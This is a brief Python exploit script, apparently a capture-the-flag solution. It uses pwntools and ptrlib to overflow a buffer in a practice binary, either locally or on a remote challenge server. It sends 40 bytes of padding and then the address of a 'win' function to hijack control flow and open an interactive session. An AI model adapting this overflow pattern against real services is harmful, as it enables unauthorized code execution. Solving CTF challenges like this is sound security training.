#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 48049)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    offset = 40

    payload = b""
    payload += b"A" * offset
    payload += ptr.p64(unwrap(exe.symbol("win")))
    io.sendlineafter("value: ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
